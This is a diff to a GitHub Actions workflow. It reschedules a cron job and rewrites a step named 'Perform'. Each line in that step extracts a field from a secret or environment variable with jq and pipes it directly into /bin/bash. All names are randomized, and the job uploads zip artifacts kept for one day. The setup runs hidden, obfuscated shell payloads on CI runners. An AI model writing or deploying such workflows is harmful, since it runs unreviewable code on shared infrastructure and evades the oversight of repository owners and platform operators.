@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '26 2,8,14,20 * * *'
+    - cron: '44 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,16 +16,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          r32064: ${{ secrets.r32064 }}
+          h50874: ${{ secrets.h50874 }}
         run: |
-          printf '%s' "$r32064" | jq -r .rwv44270 | /bin/bash
-          echo $u25861 | jq -r .bax5 | /bin/bash
-          echo $g25 | jq -r .ckuss4 | /bin/bash
-          echo $uott382 | jq -r .hst545 | /bin/bash
+          printf '%s' "$h50874" | jq -r .zf44 | /bin/bash
+          echo $ndjho05732 | jq -r .bmiky672 | /bin/bash
+          printf '%s' "$pgx876" | jq -r .eqzi2 | /bin/bash
+          echo $u535 | jq -r .mtple8 | /bin/bash
+          printf '%s' "$yqrh86" | jq -r .te6994 | /bin/bash
+          printf '%s' "$hgnj88" | jq -r .pooj977 | /bin/bash
+          echo $auf23807 | jq -r .k103 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: nrUpVRni
+          name: z63UNKxr
           path: "*.zip"
           retention-days: 1
